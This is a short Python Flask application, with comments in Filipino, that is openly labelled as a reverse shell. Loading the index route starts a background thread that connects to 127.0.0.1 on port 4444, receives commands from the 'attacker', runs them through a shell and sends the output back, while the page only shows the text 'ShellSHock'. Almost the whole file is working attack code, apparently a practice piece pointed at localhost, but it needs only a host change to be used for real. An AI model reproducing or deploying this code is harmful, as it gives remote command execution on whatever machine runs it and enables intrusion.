from flask import Flask
import socket
import subprocess
import threading

app = Flask(__name__)



# creates reverse shell

def send_to_attacker():
    try:
        host = "127.0.0.1" # setup endpoint
        port = 4444

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            command = s.recv(1024).decode("utf-8") #to yung kukuha ng command from attacker tapos coconvert niya yung bytes into text
            if command.lower() == "exit":
                exit() #close connection ng shell

            output = subprocess.run(command, shell=True, capture_output=True) #send and receive ng output from cmd
            s.send(output.stdout + output.stderr)
        s.close()
    except Exception as e:
        print(f"may issue gago {e}")


@app.route("/")
def index():
    threading.Thread(target=send_to_attacker).start()
    return "ShellSHock"


if __name__ == "__main__":
    app.run(debug=True)
